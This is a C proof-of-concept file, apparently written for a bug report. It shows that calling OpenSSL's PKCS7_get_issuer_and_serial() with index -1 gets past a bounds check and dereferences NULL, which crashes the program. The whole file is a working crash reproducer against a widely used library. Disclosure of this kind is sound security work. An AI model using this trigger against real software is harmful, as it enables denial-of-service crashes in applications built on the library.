/*
 * Minimal PoC: NULL dereference in PKCS7_get_issuer_and_serial() with negative index.
 *
 * PKCS7_get_issuer_and_serial(p7, int idx) guards with:
 *   if (sk_PKCS7_RECIP_INFO_num(rsk) <= idx) return NULL;
 * For idx=-1: num(>=0) <= -1 is false → guard passes → sk_...value(rsk,-1) returns NULL
 * → ri->issuer_and_serial dereferences NULL → SIGSEGV.
 *
 * No struct corruption. Plain public API call.
 *
 * Tested on OpenSSL 4.0.0 (tag openssl-4.0.0, commit 11b7b6e).
 */
#include <openssl/pkcs7.h>
#include <openssl/evp.h>
#include <openssl/x509.h>
#include <openssl/err.h>
#include <stdio.h>

int main(void) {
    OPENSSL_init_crypto(0, NULL);

    PKCS7 *p7 = PKCS7_new();
    PKCS7_set_type(p7, NID_pkcs7_signedAndEnveloped);
    PKCS7_set_cipher(p7, EVP_aes_128_cbc());

    /* Add one recipient so the stack is non-empty (num=1) */
    EVP_PKEY *pkey = EVP_PKEY_Q_keygen(NULL, NULL, "RSA", 1024);
    X509 *cert = X509_new();
    X509_set_version(cert, 2);
    ASN1_INTEGER_set(X509_get_serialNumber(cert), 1);
    X509_gmtime_adj(X509_get_notBefore(cert), 0);
    X509_gmtime_adj(X509_get_notAfter(cert), 86400L);
    X509_set_pubkey(cert, pkey);
    X509_NAME *name = X509_NAME_new();
    X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC,
        (unsigned char *)"test", -1, -1, 0);
    X509_set_subject_name(cert, name);
    X509_set_issuer_name(cert, name);
    X509_NAME_free(name);
    X509_sign(cert, pkey, EVP_sha256());
    PKCS7_add_recipient(p7, cert);

    fprintf(stderr, "Recipient count: %d\n",
        sk_PKCS7_RECIP_INFO_num(p7->d.signed_and_enveloped->recipientinfo));

    /* Negative index: guard (1 <= -1) is false → proceeds to NULL deref */
    fprintf(stderr, "Calling PKCS7_get_issuer_and_serial(p7, -1) ...\n");
    PKCS7_ISSUER_AND_SERIAL *ias = PKCS7_get_issuer_and_serial(p7, -1);
    fprintf(stderr, "Returned: %p (should not reach here)\n", (void *)ias);

    X509_free(cert);
    EVP_PKEY_free(pkey);
    PKCS7_free(p7);
    return 0;
}
